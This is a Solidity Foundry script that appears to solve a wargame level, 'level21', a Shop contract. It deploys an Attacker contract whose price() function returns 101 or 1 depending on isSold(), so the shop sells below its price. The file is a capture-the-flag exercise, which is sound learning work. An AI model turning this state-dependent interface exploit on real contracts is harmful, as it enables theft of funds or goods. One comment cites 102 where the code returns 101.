// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Shop } from "../src/level21.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

///@notice Abusing self created interface function 
contract Level21Solution is Script {
    Shop level = Shop(0x15EcAe078dC81f2F32CDe3F0caCe66c19C5295fE);
    
    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("before: ",level.isSold());
        Attacker _attacker = new Attacker(level);
        _attacker.attack();
        console.log("after: ",level.isSold());

        vm.stopBroadcast();
    }
}


contract Attacker {
    Shop level;
    constructor(Shop _level){
        level = _level;
    }

    // Place the attack function outside because if we call level.buy() in constructor, price() is not initialized yet.
    function attack() public {
        level.buy();
    }

    // This function will return a number according to isSold().
    // 1. When _buyer.price() is first called, it must be higher than the current price, so we provide 102
    // 2. After we pass the if() check, it calls _buyer.price() again, but this time we want to set it lower than current price.
    // Hence, we make use of isSold() logic check to be dynamic.
    function price() external view returns (uint256) {
        return level.isSold() ? 1 : 101;
    }
}